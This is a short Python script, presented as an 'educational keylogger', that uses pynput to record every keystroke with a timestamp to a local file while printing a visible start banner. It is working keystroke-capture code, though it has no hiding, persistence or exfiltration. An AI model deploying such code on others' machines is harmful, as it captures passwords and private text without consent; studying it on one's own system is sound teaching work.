from pynput import keyboard
from datetime import datetime
import os

LOG_FILE = "secure_log.txt"

def write_log(key):
    try:
        with open(LOG_FILE, "a") as f:
            time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{time_stamp} - {key}\n")
    except:
        print("Logging error")

def on_press(key):
    try:
        write_log(key.char)
    except AttributeError:
        write_log(str(key))

def main():
    print("===================================")
    print(" EDUCATIONAL KEYLOGGER STARTED ")
    print(" Logs are stored locally only ")
    print(" Press CTRL + C to stop")
    print("===================================")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
